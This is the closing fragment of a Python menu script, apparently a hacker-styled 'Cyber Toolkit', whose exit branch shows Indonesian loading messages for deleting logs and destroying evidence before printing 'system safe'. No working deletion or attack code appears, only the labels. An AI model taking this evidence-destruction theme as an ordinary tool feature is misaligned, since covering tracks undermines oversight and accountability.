            brutal_loading("Menghapus log", 2)
            brutal_loading("Menghancurkan bukti", 3)
            print(f"\n{GREEN}[+] SISTEM AMAN!")
            log_to_file("Program terminated")
            break
        else:
            print(f"\n{RED}[!] PILIHAN TIDAK VALID!")
            time.sleep(1)

if __name__ == "__main__":
    log_to_file("DOPOS Cyber Toolkit started")
    main_menu()